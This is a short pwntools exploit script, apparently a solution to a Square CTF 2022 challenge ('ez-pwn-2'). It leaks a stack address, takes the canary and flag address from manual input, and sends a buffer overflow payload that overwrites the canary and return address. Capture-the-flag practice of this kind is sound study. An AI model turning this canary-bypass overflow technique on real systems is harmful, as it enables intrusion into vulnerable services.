from pwn import*

p = remote("chals.2022.squarectf.com", 4101)
#p = process("./ez-pwn-2")
#gdb.attach(p, api=True)




p.recvuntil(b"are here: 0x")
canary_addr = int(p.recv(12),16) + 24
p.recvuntil(b"bytes:")
print("[-]Canary = "+hex(canary_addr))
print("[-]Flag = "+hex(canary_addr + 16))
p.sendline(input())
#leak canary
p.recvuntil(b":\n")
canary_fake = int(p.recv(16),16)
p.recvuntil(b"bytes:")
print("fake canary: "+hex(canary_fake))
canary = int(input(),16)
print("This is canary: "+hex(canary))
#leak_flag_addr
p.sendline(input())
p.recvuntil(b":\n")
flag_fake = int(p.recv(16),16)
print("fake flag: " +hex(flag_fake))
flag = int(input(),16) - 0x120 - 10 
print("This is flag: "+hex(flag))

print("[+] Canary = " + hex(canary))
print("[+] Flag = " + hex(flag))
payload = p64(flag)*3 + p64((canary)) + p64(flag) + p64((flag))
print(payload)

p.send(payload)

p.interactive()

#khanhne